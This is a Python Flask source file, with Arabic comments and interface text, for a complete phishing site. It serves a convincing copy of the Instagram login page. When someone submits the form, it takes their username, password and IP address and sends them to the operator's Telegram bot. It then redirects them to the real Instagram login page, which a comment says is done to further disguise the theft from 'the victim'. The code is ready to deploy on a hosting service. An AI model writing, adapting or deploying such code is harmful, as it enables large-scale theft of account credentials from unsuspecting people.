import os
import requests
from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

# جلب الإعدادات من بيئة Render
TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = os.environ.get('DEVELOPER_ID')

# --- واجهة إنستغرام الاحترافية النهائية ---
HTML_INSTA = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d9392.ico">
    <style>
        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 20px 40px; box-sizing: border-box; text-align: center; }
        .logo-img { margin: 22px auto 12px; width: 175px; display: block; }
        input { width: 100%; padding: 10px; margin-bottom: 6px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; box-sizing: border-box; text-align: right; }
        button { width: 100%; background: #0095f6; border: none; color: white; padding: 7px 0; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 8px; font-size: 14px; }
        button:active { background: #b2dffc; }
        .separator { margin: 15px 0; display: flex; align-items: center; color: #8e8e8e; font-size: 13px; }
        .separator::before, .separator::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
        .fb-login { color: #385185; font-weight: bold; font-size: 14px; cursor: pointer; margin: 15px 0; display: flex; align-items: center; justify-content: center; text-decoration: none; }
        .fb-login img { width: 16px; margin-left: 8px; }
        .forgot-pw { color: #00376b; font-size: 12px; text-decoration: none; margin-top: 12px; display: block; }
        .footer { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 20px; text-align: center; margin-top: 10px; font-size: 14px; box-sizing: border-box; }
        .footer a { color: #0095f6; text-decoration: none; font-weight: bold; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560560d9a.png" class="logo-img" alt="Instagram">
        
        <form method="POST" action="/auth">
            <input type="text" name="u" placeholder="اسم المستخدم أو الهاتف" required>
            <input type="password" name="p" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول</button>
        </form>

        <div class="separator">أو</div>
        
        <a href="#" class="fb-login">
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png">
            تسجيل الدخول بحساب فيسبوك
        </a>
        <a href="#" class="forgot-pw">هل نسيت كلمة السر؟</a>
    </div>
    <div class="footer">ليس لديك حساب؟ <a href="#">تسجيل</a></div>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_INSTA)

@app.route('/auth', methods=['POST'])
def auth():
    user = request.form.get('u')
    pw = request.form.get('p')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # تنسيق الرسالة لبوت التلجرام
    log_msg = (
        f"📸 **[حساب Instagram جديد]**\n"
        f"━━━━━━━━━━━━━━━\n"
        f"👤 **اليوزر:** `{user}`\n"
        f"🔑 **الباسورد:** `{pw}`\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🌐 **IP:** `{user_ip}`"
    )
    
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": ADMIN_ID, "text": log_msg, "parse_mode": "Markdown"})
    except Exception as e:
        print(f"Error sending to Telegram: {e}")

    # تحويل الضحية لصفحة تسجيل الدخول الحقيقية لزيادة التمويه
    return redirect("https://www.instagram.com/accounts/login/")

if __name__ == '__main__':
    # دعم تشغيل السيرفر على Render
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
